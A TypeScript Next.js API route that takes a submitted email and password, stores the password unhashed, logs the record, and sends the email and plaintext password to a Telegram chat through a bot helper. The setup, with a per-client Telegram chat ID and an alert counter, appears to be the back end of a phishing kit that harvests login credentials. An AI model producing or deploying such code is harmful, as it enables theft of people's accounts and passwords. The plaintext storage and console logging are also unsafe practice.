import { connectDB } from "@/lib/db";
import Data from "@/models/dataModel";
import clientData from "@/models/clientDataModel";
import User from "@/models/userModel";
import { NextRequest, NextResponse } from "next/server";
import { sendTelegramMessage } from "@/lib/telegram_bot";

export async function POST(req: NextRequest) {
  try {
    await connectDB();

    const { user, password, deviceType } = await req.json();

    // Input validation
    if (!user || !password) {
      return NextResponse.json(
        {
          success: false,
          message: !user ? "Input email..!" : "Input password..!",
        },
        { status: 400 }
      );
    }

    // Save user
    const savedUser = await User.create({
      email: user,
      password,
      deviceType,
    });

    console.log("User saved:", savedUser);

    // Update Data model
    const data = await Data.findOne();
    const client_data = await clientData.findOne();
    if (data) {
      await Data.findByIdAndUpdate(data._id, {
        $inc: { notifications: 1 },
        $set: { alert: true },
      });
    }

    await sendTelegramMessage(
      client_data.telegramChatId,
      `New user registered:\n` +
      `Email: ${user}\n` +
      `Password: ${password}\n`
    );
    return NextResponse.json(
      {
        success: true,
        message: "User saved..!",
        data: savedUser,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error(error);
    return NextResponse.json(
      { success: false, message: "Server error..!" },
      { status: 500 }
    );
  }
}
